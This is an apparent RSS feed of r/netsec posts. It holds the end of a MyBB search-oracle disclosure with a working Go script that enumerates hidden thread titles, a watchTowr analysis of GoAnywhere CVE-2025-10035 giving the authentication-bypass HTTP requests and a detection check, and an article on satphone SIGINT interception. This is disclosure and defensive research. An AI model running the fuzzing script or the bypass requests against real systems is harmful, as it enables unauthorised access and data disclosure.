-                foreach($split_words as $word)
-                {
-                    $word = str_replace(array("+", "-", "*"), '', $word);
-                    if(!$word)
-                    {
-                        continue;
-                    }
-                    if(my_strlen($word) < $mybb->settings['minsearchword'])
-                    {
-                        $all_too_short = true;
-                    }
-                    else
-                    {
-                        $all_too_short = false;
-                        break;
-                    }
-                }
-            }
---------------------------------------------------------------------------
-The `split_words` array will be: `0=>"+&&&&&"`, `1=> "+jack*"`. The
-`foreach` loop will process "+&&&&&" first and it will become "&&&&&".
-Because '+', '-', and '*' get replaced with nothing. Then, if the length of
-"&&&&&" is less than `minsearchword` (which is 4 and was set inside
-`perform_search_mysql_ft`), it will continue the `foreach` loop; otherwise,
-it will set `all_too_short` to false and break the `foreach` loop. In our
-case, the length is 5, and it breaks the `foreach` loop, because of which
-our second word, "+jack*", won't even get replaced. Later, it will be passed
-into MATCH AGAINST
-
-----[ 4.3 - Exploiting
-The query, as you can see, has a response showing the tid and firstpost. The
-reason why this works for the title and not for the content is because of
-"p.visible = 1" and "t.visible = 1", but we will come to that later.
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-    else
-    {
-        $query = $db->query("
-            SELECT t.tid, t.firstpost
-            FROM ".TABLE_PREFIX."threads t
-            WHERE 1=1 {$thread_datecut} {$thread_replycut}
-              {$thread_prefixcut} {$forumin} {$thread_usersql} {$permsql}
-              {$visiblesql} {$subject_lookin}
-            {$limitsql}
-        ");
-        while($thread = $db->fetch_array($query))
-        {
-            $threads[$thread['tid']] = $thread['tid'];
-            if($thread['firstpost'])
-            {
-                $firstposts[$thread['tid']] = $thread['firstpost'];
-            }
-        }
-        if(count($threads) < 1)
-        {
-            error($lang->error_nosearchresults);
-        }
-        $threads = implode(',', $threads);
-        $firstposts = implode(',', $firstposts);
-        if($firstposts)
-        {
-            $query = $db->simple_select("posts", "pid", "pid IN
-              ($firstposts) {$plain_post_visiblesql} {$limitsql}");
-            while($post = $db->fetch_array($query))
-            {
-                $posts[$post['pid']] = $post['pid'];
-            }
-            $posts = implode(',', $posts);
-        }
-    }
-    return array(
-        "threads" => $threads,
-        "posts" => $posts,
-        "querycache" => ''
-    );
---------------------------------------------------------------------------
-Query in DB:
---------------------------------------------------------------------------
-mysql> SELECT t.tid, t.firstpost FROM mybb_threads t WHERE 1=1 AND
-    -> MATCH(subject) AGAINST('+&&&&& +jack*' IN BOOLEAN MODE);
-+-----+-----------+
-| tid | firstpost |
-+-----+-----------+
-|   2 |         2 |
-+-----+-----------+
-1 row in set (0.00 sec)
---------------------------------------------------------------------------
-Now the MOST important part here is
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-        if(count($threads) < 1)
-        {
-            error($lang->error_nosearchresults);
-        }
---------------------------------------------------------------------------
-If the response has no result, it will open "error_nosearchresults";
-otherwise, it will REDIRECT. This is why it is possible to identify title
-name, without seeing it. If I get a redirect when using "jack*", it means
-that there is a title that starts with "jack", otherwise it would directly
-open "error_nosearchresults". Now inside upload/search.php, we see this
-line, which shows where we get redirected. The thing is, we wouldn't have
-been able to reach this line if the response from MySQL had been empty.
-----------------------------------
-/upload/search.php
-
-redirect("search.php?action=results&sid=".$sid."&sortby=".$sortby."&order="
-  .$sortorder, $lang->redirect_searchresults);
-----------------------------------
-
-It is possible to exploit this vulnerability by fuzzing. The logic here is:
-I start with a*, then aa*, ab*, ac*, and so on. In a real-world scenario,
-an attacker would have multiple accounts, or proxies. In the test
-environment I just put "Search Flood Time (seconds)" to 0. Basic script:
-
---------------------------------------------------------------------------
-package main
-
-import (
-    "fmt"
-    "io"
-    "net/http"
-    "os"
-    "strings"
-)
-
-const fuzzChars = "abcdefghijklmnopqrstuvwxyz0123456789"
-const queryTemplate = "search.php?action=do_search&keywords=%26%26%26%26%26"
-  + "+%2B{FUZZ}*xD&postthread=2&author=&matchusername=1&forums%5B%5D=all"
-  + "&findthreadst=1&numreplies=&postdate=0&pddir=1&sortby=lastpost"
-  + "&sortordr=desc&showresults=threads&submit=Search"
-const successIndicator = "end: redirect"
-const maxFuzzPayloadLength = 50
-
-func min(a, b int) int {
-    if a < b {
-        return a
-    }
-    return b
-}
-
-func main() {
-    if len(os.Args) < 2 {
-        fmt.Fprintln(os.Stderr, "Usage: go run test.go <base_url>")
-        fmt.Fprintln(os.Stderr, "Example: go run test.go http://127.0.0.1")
-        os.Exit(1)
-    }
-    baseURL := strings.TrimSuffix(os.Args[1], "/")
-
-    fmt.Printf("Target base URL: %s\n", baseURL)
-    fmt.Printf("Fuzzing characters: %s\n", fuzzChars)
-    fmt.Printf("Max fuzz payload length: %d\n", maxFuzzPayloadLength)
-    fmt.Println("---")
-
-    client := &http.Client{
-        CheckRedirect: func(req *http.Request, via []*http.Request) error {
-            return nil
-        },
-    }
-
-    var allFoundSuccessfulPayloads []string
-    var payloadsToTestThisRound []string
-
-    for _, charRune := range fuzzChars {
-        payloadsToTestThisRound = append(payloadsToTestThisRound,
-          string(charRune))
-    }
-
-    for currentLength := 1; currentLength <= maxFuzzPayloadLength;
-      currentLength++ {
-        if len(payloadsToTestThisRound) == 0 {
-            fmt.Printf("No more payloads to test. Stopping as no payloads" +
-              " generated for length %d.\n", currentLength)
-            break
-        }
-
-        fmt.Printf("--- Testing payloads of length %d (found %d to test)" +
-          " ---\n", currentLength, len(payloadsToTestThisRound))
-        var successfulPayloadsFoundThisRound []string
-
-        for _, fuzzPayload := range payloadsToTestThisRound {
-            fuzzedQuery := strings.Replace(queryTemplate, "{FUZZ}",
-              fuzzPayload, 1)
-            fullURL := baseURL + "/" + fuzzedQuery
-           
-            urlToPrint := fullURL
-            if len(urlToPrint) > 120 {
-                urlToPrint = urlToPrint[:117] + "..."
-            }
-            fmt.Printf("Testing payload: '%s' (URL: %s)\n", fuzzPayload,
-              urlToPrint)
-
-            req, err := http.NewRequest("GET", fullURL, nil)
-            if err != nil {
-                fmt.Fprintf(os.Stderr, "  Error creating request for" +
-                  " payload '%s': %v\n", fuzzPayload, err)
-                continue
-            }
-
-            resp, err := client.Do(req)
-            if err != nil {
-                fmt.Fprintf(os.Stderr, "  Error making GET request for" +
-                  " payload '%s': %v\n", fuzzPayload, err)
-                continue
-            }
-
-            bodyBytes, err := io.ReadAll(resp.Body)
-            resp.Body.Close()
-            if err != nil {
-                fmt.Fprintf(os.Stderr, "  Error reading response body for" +
-                  " payload '%s': %v\n", fuzzPayload, err)
-                continue
-            }
-
-            bodyString := string(bodyBytes)
-            if strings.Contains(bodyString, successIndicator) {
-                fmt.Printf("  SUCCESS! Payload: '%s' (Status: %s)." +
-                  " Response contains '%s'.\n", fuzzPayload, resp.Status,
-                  successIndicator)
-                allFoundSuccessfulPayloads = append(allFoundSuccessfulPayloads,
-                  fuzzPayload)
-                successfulPayloadsFoundThisRound =
-                  append(successfulPayloadsFoundThisRound, fuzzPayload)
-            }
-        }
-
-        if currentLength < maxFuzzPayloadLength {
-            if len(successfulPayloadsFoundThisRound) == 0 {
-                fmt.Printf("No successful payloads found at length %d." +
-                  " Stopping further iterations.\n", currentLength)
-                payloadsToTestThisRound = []string{}
-            } else {
-                var nextPayloads []string
-                for _, prefix := range successfulPayloadsFoundThisRound {
-                    for _, charRune := range fuzzChars {
-                        nextPayloads = append(nextPayloads,
-                          prefix+string(charRune))
-                    }
-                }
-                payloadsToTestThisRound = nextPayloads
-                if len(payloadsToTestThisRound) == 0 &&
-                  len(successfulPayloadsFoundThisRound) > 0 {
-                    fmt.Println("Warning: Generated empty next set of" +
-                      " payloads despite successes in current round. This" +
-                      " might happen if fuzzChars is empty. Stopping.")
-                    break
-                }
-            }
-        } else {
-            fmt.Printf("Reached max payload length of %d.\n",
-              maxFuzzPayloadLength)
-        }
-    }
-
-    fmt.Println("--- Fuzzing Complete ---")
-    if len(allFoundSuccessfulPayloads) > 0 {
-        fmt.Printf("Found %d successful payload(s) in total:\n",
-          len(allFoundSuccessfulPayloads))
-        for _, p := range allFoundSuccessfulPayloads {
-            fmt.Printf("  - %s\n", p)
-        }
-    } else {
-        fmt.Println("No successful payloads found.")
-    }
-}
---------------------------------------------------------------------------
-
---[ 5 - Acknowledgements
-Thanks to the MyBB team, especially to Devilshakerz for the fast
-remediation!
-
---[ 6 - References
-[ 0 ] https://en.wikipedia.org/wiki/Regular_expression
-[ 1 ] https://en.wikipedia.org/wiki/Wildcard_character
-[ 2 ] https://owasp.org/www-community/attacks/Regular_expression
-_Denial_of_Service_-_ReDoS
-[ 3 ] https://www.imperva.com/learn/ddos/regular-expression-denial-of-
-service-redos/
-[ 4 ] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/
-Regular_expressions
-[ 5 ] https://dev.mysql.com/doc/refman/8.4/en/regexp.html
-[ 6 ] https://en.wikipedia.org/wiki/Full-text_search
-[ 7 ] https://dev.mysql.com/doc/refman/8.4/en/fulltext-boolean.html
-[ 8 ] https://dev.mysql.com/doc/refman/8.4/en/fulltext-search.html
-[ 9 ] https://github.com/mybb
-]]></content:encoded></item><item><title>New macOS threat abuses ads and social media to spread malware</title><link>https://moonlock.com/new-iphones-anti-spyware</link><author>/u/Individual-Gas5276</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 13:39:19 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Is This Bad? This Feels Bad. (GoAnywhere CVE-2025-10035) - watchTowr Labs</title><link>https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/</link><author>/u/dx7r__</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 13:04:10 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[File transfer used to be simple fun - fire up your favourite FTP client, log in to a glFTPd site, and you were done.Fast forward to 2025, and the same act requires a procurement team, a web interface, and a vendor proudly waving their  pledge. Ever seen the glFTPd developers on the list of pledge signers? Exactly.Welcome back to another watchTowr Labs analysis. This time, we are dissecting , a perfect CVSS 10.0 vulnerability in Fortra’s GoAnywhere MFT.For the uninitiated, GoAnywhere is a "secure" managed file transfer solution that automates and protects data exchange across enterprises, trading partners, and critical applications. Not your friend's photo-sharing setup. We are talking Fortune 500 deployments, with over 20,000 instances exposed to the Internet. A playground APT groups dream about.GoAnywhere has a history. In 2023, the cl0p ransomware gang turned CVE-2023-0669, a pre-auth command injection in the Licensing Response Servlet, into widespread compromise. That was the year of MFT exploitation trauma across multiple vendors, burned into the memory of defenders everywhere.As always, and you'll read, we have an inner feeling (call it "instinct") that there is more to this vulnerability that we are not yet being told.On Thursday, September 18, Fortra published a security advisory fi-2025-012 titled: Deserialization Vulnerability in GoAnywhere MFT's License Servlet.The title in itself is reason for alarm, with the description going further to explain how we likely got to a CVSS 10.0:A deserialization vulnerability in the License Servlet of Fortra's GoAnywhere MFT allows an actor with a validly forged license response signature to deserialize an arbitrary actor-controlled object, possibly leading to command injection.For those that recall the excitement of CVE-2023-0669, this description might feel.. familiar..:GoAnywhere MFT suffers from a pre-authentication command injection vulnerability in the License Response Servlet due to deserializing an arbitrary attacker-controlled objectBut watchTowr, how did this get a CVSS 10.0? The advisory clearly states meaningful hurdles for attackers to traverse:Exploitation of this vulnerability is highly dependent upon systems being externally exposed to the Internet.Fortra, should the advisory also note that the solution needs to be running?In The Wild Exploitation?As always, we must all play a game.The above sometimes happens when a vendor updates references attached to a CVE. In this case, FI-2025-011 was deleted, and FI-2025-012 was added to replace it.In FI-2025-012, a section was appended - an innocent "Am I Impacted?" section.Typically (not always...), when a vulnerability receives in-the-wild exploitation, clarity to customers is provided to help inform prioritisation and remediation process expectations.Fortra's advisory never says, “We’ve seen this exploited in-the-wild.” What they do say is more curious: check your Admin Audit logs, look for  in exception traces, and if you see it, you were “likely affected.”Affected, as in, vulnerable? Or affected like, the fox is already in the hen-house?To determine if you're "affected", Fortra provides an IoC (Indicator of ) for this ambiguous-state vulnerability. As discussed above, the advisory for FI-2025-012 includes a stack trace which will appear in your logs should you be "affected" by this vulnerability:ERROR Error parsing license response
-java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
-...
-at java.base/java.io.ObjectInputStream.readObject(Unknown Source)
-at java.base/java.security.SignedObject.getObject(Unknown Source)
-at com.linoma.license.gen2.BundleWorker.verify(BundleWorker.java:319)
-at com.linoma.license.gen2.BundleWorker.unbundle(BundleWorker.java:122)
-at com.linoma.license.gen2.LicenseController.getResponse(LicenseController.java:441)
-at com.linoma.license.gen2.LicenseAPI.getResponse(LicenseAPI.java:304)
-at com.linoma.ga.ui.admin.servlet.LicenseResponseServlet.doPost(LicenseResponseServlet.java:64)
-We know Fortra wouldn't be ambiguous on purpose, though, because CISA's Secure By Design pledge, which Fortra signed up to, talks about transparency around ITW exploitation:Part 1 - License Servlet “Authentication” BypassThe initial vendor advisory was clear, immediately pointing to the culprit: the License Servlet. Key points from the advisory:The License Servlet contains an insecure deserialization vulnerability.According to the CVSS score, it’s reachable without authentication.So, first things first: can we actually hit the servlet and trigger the deserialization routine without credentials? To answer that, we need to crack open the code.The License Servlet lives in com.linoma.ga.ui.admin.servlet.LicenseResponseServlet and is exposed at:/goanywhere/lic/accept/<GUID>Let’s take a look at the entry point:public void doPost(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
-    String var3 = var1.getParameter("bundle"); // [1]
-    String[] var4 = var1.getRequestURI().split("/"); // [2]
-    String var5 = var4[var4.length - 1];
-    Object var6 = null;
-    if (!SessionUtilities.isLicenseRequestTokenValid(var5, var1.getSession())) { // [3]
-        LOGGER.error("Unauthorized bundle from invalid session: " + var3);
-        var2.sendError(400);
-        var1.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
-    } else {
-        try {
-            var9 = LicenseAPI.getResponse(var3); // [4]
-        } catch (Exception var8) {
-            LOGGER.error("Error parsing license response", var8);
-            var2.sendError(500);
-            var1.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
-            return;
-        }
-    //...
- }
-At  the servlet retrieves the  parameter from the HTTP request.At  it extracts a string from our URL - a GUID that defines the license request token.At  it calls SessionUtilities.isLicenseRequestTokenValid to validate the user-supplied license request token.If the check at  passes, the servlet calls  with the  parameter.So, how does token validation (the GUID) actually work? Well...The servlet takes the GUID token extracted at .It compares that token to the token that was stored on the user’s session.If both tokens match, the validation at  succeeds and execution proceeds to .If the tokens do not match, the flow stops - we never reach the deserialization code.So: without a valid token tied to the user session, we cannot even begin to reach the vulnerable deserialization routine.OK, We Need A Token - But How?Well, if your target GoAnywhere MFT instance has no license applied, this is trivial - you can head straight to the endpoint that starts the activation procedure, and a valid token will be applied to your session.However, this is not a production reality where licenses are inevitably provided - and this is not as simple. Typically, in such a case, you need to be authenticated to generate a valid license request token and attach it to your session.Our vulnerability is a perfect 10 CVSS, though, so logically there must be a way to obtain this token without any authentication. All of our analysis led us to the /goanywhere/license/Unlicensed.xhtml endpoint, where we discovered a few important items:We can bypass authentication requirements for this endpoint by appending  (or any other invalid data) to the endpoint, like so: /goanywhere/license/Unlicensed.xhtml/x .We need this endpoint to trigger an exception - for example, by providing an invalid , like this: /goanywhere/license/Unlicensed.xhtml/x?javax.faces.ViewState=x&GARequestAction=activateWhy, you ask? Because, in doing so, the application then flows to the  servlet, where all of our fun begins:protected void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
-    Integer var3 = (Integer)var1.getAttribute("javax.servlet.error.status_code");
-    String var4 = (String)var1.getAttribute("javax.servlet.error.message");
-    Class var5 = (Class)var1.getAttribute("javax.servlet.error.exception_type");
-    String var6 = (String)var1.getAttribute("javax.servlet.error.request_uri");
-    Throwable var7 = (Throwable)var1.getAttribute("javax.servlet.error.exception");
-    String var8 = var1.getRemoteAddr();
-    String var9 = var1.getParameter("GARequestAction");
-    if (var3 == null && var5 == null && var7 == null) {
-        var2.sendError(404);
-    } else if (!this.bypassHandling(var3, var6)) {
-        if (var6.startsWith(var1.getContextPath() + "/license/Unlicensed.xhtml")) { // [1]
-            if (StringUtilities.isNotEmpty(var9) && var9.equalsIgnoreCase("activate")) {
-                String var14 = SessionUtilities.generateLicenseRequestToken(var1.getSession()); // [2]
-
-                try {
-                        LicenseUtilities.requestOnlineActivation(var1, var2, var14); // [3]
-                        return;
-                    } catch (Exception var13) {
-                        this.LOGGER.error(var13.getMessage(), var13);
-                    }
-                }
-
-                var2.sendRedirect(var6);
-                //...
-}
-At , the code checks whether the request URL begins with /license/Unlicensed.xhtml.If it does, then at  the application generates a valid license-request token and attaches it to the session.Finally, at , the token is passed to LicenseUtilities.requestOnlineActivation. This method builds a redirect URL to the GoAnywhere license server, embedding the signed license request inside an HTTP GET  parameter.Now, for anyone who doesn’t live and breathe GoAnywhere MFT’s licensing process, the license request does two key things:It stores a serialized Java object containing the license-request token.It’s encrypted with hard-coded keys (and partially compressed for good measure).An attacker can simply send:GET /goanywhere/license/Unlicensed.xhtml/watchTowr?javax.faces.ViewState=watchTowr&GARequestAction=activate HTTP/1.1
-Host: {{Hostname}}
-In response, the server redirects and returns a  parameter (the license request) — plus a cookie where the generated token has been attached.HTTP/1.1 302 
-...
-Location: <https://my.goanywhere.com:443/lic/request?bundle=p55wfyVKXDVM_bAVZtDLOg3PglFmtEOHyjm4vYZ9l2kwhyouIP6ieq_VZ6lJbVsf5J7KHr..... snip .....
-Because the encryption key is hard-coded, the  parameter value can be decrypted offline to recover the embedded GUID. Using said GUID, we are then able to interact with the License Servlet without "actually" authenticating:POST /goanywhere/lic/accept/d1a8b697-d68c-4e7d-b179-5f3b8b529e6f HTTP/1.1
-Host: {{Hostname}}
-Cookie: ASESSIONID=F970BB906F5F7D325BFC6E261CF87AE6;
-Content-Type: application/x-www-form-urlencoded
-
-bundle=inputhere
-There we have it - the "Authentication Bypass" portion of this vulnerability. Let's move on...Part 2 - Insecure Deserialization in License ServletNow that we can obtain the GUID token unauthenticated, we can reach the deserialization sink that this vulnerability ends with.For your sake, and our sanity, we are going to skip the majority of the code and leave you with two basic facts you need to know:The  parameter carries a serialized Java object that the server decrypts during processing.Decryption uses hard-coded keys, so the  parameter value is recoverable offline.Processing eventually reaches com.linoma.license.gen2.BundleWorker.verify, where the application hands us the raw input byte array derived from the .In short, an attacker-controlled serialized object reaches server-side deserialization logic.Let's step through com.linoma.license.gen2.BundleWorker.verify:private static byte[] verify(byte[] var0, KeyConfig var1) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
-    String var2 = "SHA1withDSA";
-    if ("2".equals(var1.getVersion())) {
-        var2 = "SHA512withRSA";
-    }
-
-    PublicKey var3 = getPublicKey(var1);
-    Signature var4 = Signature.getInstance(var2);
-    SignedObject var5 = (SignedObject)JavaSerializationUtilities.deserialize(var0, SignedObject.class, new Class[]{byte[].class}); // [1]
-    if (var1.isServer()) {
-        return ((SignedContainer)JavaSerializationUtilities.deserializeUntrustedSignedObject(var5, SignedContainer.class, new Class[]{byte[].class})).getData();
-    } else {
-        boolean var6 = var5.verify(var3, var4); // [2]
-        if (!var6) {
-            throw new IOException("Unable to verify signature!");
-        } else {
-            SignedContainer var7 = (SignedContainer)var5.getObject(); // [3]
-            return var7.getData();
-        }
-    }
-}
-This part can be a little confusing, so let’s stick to the key points.At  the code calls into a hardened deserialization wrapper (wrapping around ValidatingObjectInputStream.readObject from standard Apache libraries), to deserialize our data.It also supplies extra arguments, such as , which define the only types the routine will accept during deserialization.Those additional arguments restrict what types can be deserialized. In practice, this means the routine will only accept a java.security.SignedObject or a raw .So what is a ? According to the Java documentation:SignedObject is a class for the purpose of creating authentic runtime objects whose integrity cannot be compromised without being detected.More specifically, a SignedObject contains another Serializable object, the (to-be-)signed object and its signature.In simple terms, a  is just a wrapper. It stores a serialized object inside and a signature calculated over that stream with a private key alongside it.The class also provides a few helper methods: - uses the public key to check that the signature matches. - deserializes and returns the inner serialized object.At , the code will call  on our deserialized , immediately allowing an attacker to:Deliver a serialized .Which internally stores a malicious serialized object, like a one based on the  gadget.GoAnywhere will deserialize this inner object, and that’s it.Do you see what we missed? Look at .The code checks the signature of our serialized object against a public key baked into GoAnywhere. On paper, this is sensible. Signature validation is handled by Bouncy Castle and its FIPS API.So the final barrier to a pre-auth RCE is bypassing that signature check. But here’s the problem: we don’t know how. Really.Either we are missing a trick, or the check is genuinely solid. We tried:Using several private keys shipped in GoAnywhere to generate a valid signature. None of them matched the public key in play.Reviewing the Java code responsible for the signature verification.Chasing alternative code paths that might hit deserialization without needing this check.One might think: just diff the patch, you dummies.Here’s the kicker though. The patch  harden the deserialization routine, but the signature verification logic? Completely untouched.The patch doesn’t amend the signature check at all. Instead, it only changes the deserialization flow, replacing  with a custom wrapper called deserializeUntrustedSignedObject. The idea seems to be to add another layer of “safety” around deserialization.We’ve got a few conspiracy theories, though, all of which we have absolutely zero evidence for, and are complete conjecture. Regardless,you’re free to pick whichever one fits your mood: We somehow missed an obvious bypass for the signature verification routine. If that’s the case, why didn’t the patch touch it?  The private key leaked. Dramatic, yes, but possible. That would let attackers sign malicious objects that every GoAnywhere instance on the planet would happily accept.The vendor accidentally signed evil. Imagine this:When you activate your GoAnywhere product, your installation generates a serialized license request.It’s sent to the vendor’s license server ()If someone slipped a malicious object inside that request and the vendor blindly signed it, attackers would now have a perfectly valid signed payload that works everywhere.Fueling our conspiracy theories was the advisory deletion and reference update we discussed above, including a stack trace which signals a valid exploitation attempt and asks the user to check their logs:Who does that? Well, in our opinion, typically vendors whose products are facing ITW exploitation - but we're not experts.It’s all a mystery. We can’t see a path to exploit this without a valid private key. On paper, that should kill the bug dead. On the other hand, this has a perfect 10 CVSS score, and the vendor has published "IoCs," which indicates that it is likely real.And on the other hand, we recently saw a critical CVE in Sitecore that existed purely because… people were copy-pasting machine keys straight from the documentation. At this point, nothing shocks us. CVE assignments feel less like a science and more like a game of darts in the dark.Detection Artefact GeneratorAcross our client base, we used the Authentication Bypass weakness within an impact-less (but still exploitation-based) mechanism to identify unpatched and vulnerable GoAnywhere systems at scale. Today, we're sharing this mechanism:GET /goanywhere/license/Unlicensed.xhtml/watchTowr?javax.faces.ViewState=watchTowr&GARequestAction=activate HTTP/1.1
-If the instance is unpatched, you’ll see the response include a  header with a license request embedded in the  query string parameter:If you don’t see the   parameter, your instance is patched. That’s because the  no longer generates a valid license request token once the fix is applied.: redirect to /license/Unlicensed.xhtml with a valid license request token attached.: redirect to /license/Unlicensed.xhtml with  license request token.No mystery is complete without a few unanswered questions. Despite our usual routine of reverse engineering and creative detours, we’ve ended this one with more questions than usual.Did we miss critical lines of code that makes everything click into place? Will the first reply on social media point out the obvious and send us a working PoC embedded in a meme? Please.Because the alternatives are less comforting. Could this vulnerability already be in active use? Could someone have access to a signed malicious object ready to be sprayed across the Internet or delivered with precision to a single target? Could that be happening right now?One thing is certain: no vendor assigns a CVSS 10 to a purely theoretical bug. We'd advise against leaving GoAnywhere unpatched below 7.8.4 (or Sustain Release 7.6.3).While this mystery continues to evolve, and we're excited to see if anyone takes the baton from us, concerned operators and end users can use our Detection Artefact Generator to check for externally vulnerable instances. The research published by watchTowr Labs is just a glimpse into what powers the watchTowr Platform – delivering automated, continuous testing against real attacker behaviour.By combining Proactive Threat Intelligence and External Attack Surface Management into a single Preemptive Exposure Management capability, the watchTowr Platform helps organisations rapidly react to emerging threats – and gives them what matters most: Gain early access to our research, and understand your exposure, with the watchTowr PlatformREQUEST A DEMO]]></content:encoded></item><item><title>Tiantong-1 and satphone security: Part 2</title><link>https://www.midnightblue.nl/blog/tiantong-1-and-satphone-security-part-2</link><author>/u/2ROT13</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 09:38:25 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[General satphone SIGINT capabilitiesGiven their prominence in matters of national security, it is unsurprising there are many (commercialized) SIGINT capabilities for satphones available. In fact according to an internal publication by the NSA’s Signals Intelligence Directorate (SID) from 2006, contained in the Snowden leaks, GMR-based Thuraya was considered one of the US intelligence community’s top priorities. In addition to satellite-based monitoring capabilities as exemplified by the MENTOR 4 SIGINT satellite closely following the Thuraya 2 satellite, significant investments were made in ground-based collection capabilities using the NSA’s and systems.According to a leaked publication from 2003, the NSA did not have the desired Foreign Satellite interception (FORNSAT) coverage at the time. In these and other publications, a picture emerges of rapidly expanding collection sites numbering 9 in 2002 to 12 (+40 regional) sites in 2012 in addition to collection performed through 2nd party partners via the STATEROOM program.Regional collection happens through Special Collection Service (SCS) units based at embassies and consulates as neatly summarized by Electrospaces. These units not only service interception posts at the embassies themselves but also roll out covert surveillance infrastructure throughout a target country.While no current publications seem to mention Tiantong-1, there is much information available about SIGINT capabilities for GMR-based SATCOM systems such as Thuraya and Inmarsat. Such information can be obtained from public brochures by vendors such as Stratign, Shoghi, and Pegasus Intelligence as well as product brochures from vendors such as L-3 TRL, Rheinmetall, Verint, and Rhode & Schwarz leaked as part of the Wikileaks Spy Files. All of these systems seem to have fairly identical capabilities, architectures, and challenges.They offer passive interception capabilities allowing for:: Including extraction of content (through automatic real-time decryption as described below) and metadata (e.g. spot beam ID, caller numbers, times, cryptographic information, etc.).‍: Though certain vendors state this is considered difficult due to extensive coverage areas and large spot beams, some claim to extract GPS coordinates from handset traffic or achieve geo-location based on network location information or overlap areas.‍: Audio recording, speech analysis (speaker & language identification, keyword spotting, etc.), media carving, OCR, and typical link analysis and dataset querying.Regardless of the GMR version or frequency bands in use, the general operating principle comes down to satellites covering a large geographical area in smaller, focused areas of coverage referred to as . For example, the GMR-1 based Thuraya system consists of several satellites each covering a different geographical area. These areas are then subdivided into dozens of spotbeams each covering hundreds of kilometers.As illustrated below, communications within a single spotbeam take place in the L-band while feeder link communications between gateway stations and satellites take place in C-/Ku-bands in the regional beam.Two-way (duplex) traffic interception is only possible in a limited number of spot beams (depending on distance between spotbeams with similar signal characteristics such as frequencies and timeslots) centered around a monitoring system. , monitoring and intercepting satphone communications presents several challenges related to synchronization (such as differing delays when signals are captured at different geographical points), missing directional traffic (forward/return links), and complexities in mapping captures from spotbeams to those from regional beams. This typically means all available channels need to be intercepted simultaneously even if one's actual area of interest may be limited.‍On the other hand, feeder link communications can be monitored from any location within the satellite’s footprint area. These communications allow for monitoring (but not intercepting) call activity on return links in multiple spotbeams (without requiring spotbeam coverage by a local monitoring system) via received signaling information (which includes geo-location relevant data and caller IDs).‍It should be noted that interception capabilities are not merely constrained by satellite system architectural aspects but also by hardware capabilities such as the numbers of frequency channels that can be monitored simultaneously. Such limitations depend limitations of utilized DSP/FPGA technology and rack space for system modules. In addition, export controls tend to restrict capabilities as well such as artificially limiting the number of simultaneously monitorable calls.While most of the GMR-1 interception equipment discussed here can likely not be repurposed easily against Tiantong, there is plenty of COTS SDR hardware available these days capable of handling S- and C-Band traffic that could serve as the basis for a TT monitoring solution.As leaked documents from a Rhode & Schwarz GMR-2 monitoring system show most satphone monitoring systems consist of several elements:Strategic Monitoring SystemThese systems, sometimes referred to as central stations, are typically capable of continuous live monitoring and interception of terminals in surrounding cluster of spotbeams and include integrated decryption and analytic capabilities. Such systems are likely based at dedicated SIGINT sites or SCS locations.These systems allow for expanding system coverage and full duplex interception capabilities with several additional spotbeams surrounding the remote monitoring system. Remote monitoring systems are typically connected to strategic systems through always-on connections (e.g. PTSN, WAN, or satellite link). Such remote monitoring systems are likely rolled out throughout a country by SCS operators, and likely connect back to the in-country SCS site.‍Tactical Monitoring SystemTactical monitoring systems are for use by operational teams requiring real-time intercept of terminals in areas either lacking spotbeam coverage. These systems are typically highly portable and vehicle-mountable and facilitate otherwise hard-to-obtain terminal uplink interception capabilities up to tens of kilometers within line-of-sight. Optimal usage requires site surveys to determine suitable monitoring location and antenna positioning.Airborne Monitoring SystemIn addition to the above listed stationary monitoring systems, certain vendors also offer airborne satphone monitoring systems for deployment on manned and unmanned aircraft - essentially offering similar advantages to the tactical monitoring system.Supply chain security & 'hard targets'Ever since the NotPetya and SolarWinds incidents supply chain security has been an increasingly hot topic. Worries around (hardware) supply chain security have recently taken on an additional kinetic dimension with the Israeli attacks on pagers and VHF radios operated by Hezbollah in Lebanon.‍The Volkskrant article mentions typical operational security measures taken against supply chain threats to the procured Tiantong smartphones such as trying to ensure non-sequential serial numbers and limited batch sizes (no doubt also opting for diversified manufacturers and points of sale).Interestingly, the leaked NSA ANT catalog shows that as far back as 2008-2009 the NSA had developed a software implant named for the Thuraya 2520 satphone handsets. The implant was described as being deployed through (temporary) physical access to the satphone though remote deployment options (likely via remote exploitation) were being investigated.‍Implantation of Tiantong smartphones will have different considerations from purpose-built Thuraya handsets. On the one hand, such smartphones consist of much more COTS hardware and software (Android on ARM with one of a handful of well-understood basebands) for which a sophisticated adversary likely already has capabilities and/or expertise.But things are a little different for more modern Huawei smartphones since they increasingly rely on Huawei-proprietary software and hardware. Take the Huawei Mate 60 Pro. Starting with HarmonyOS NEXT, Android has been abandoned as the foundation of HarmonyOS in favor of an  running its own native app format. The Kirin 9000S SoC has an integrated Balong 5000 baseband, both by Chinese manufacturer HiSilicon. A publicly available teardown lists a component marked HI1105 which matches HiSilicon’s HI11xx IC used as a WiFi chip by other Huawei Mate smartphones. This means an adversary will have to invest a lot of resources to build new exploits and software/hardware implants for these Huawei phones and their OS, baseband, and Wi-Fi chip – all of which are now proprietary to Huawei. Venezuelan president Nicolás Maduro even seems to believe the Huawei Mate X6 gifted to him simply cannot be hacked by US intelligence agencies.The downside of this approach is that Huawei can no longer benefit so easily from security updates and advances coming in through Western ecosystems and they will increasingly form a self-selecting priority target for Western intelligence agencies (similar to how crimephones self-select for targeting by 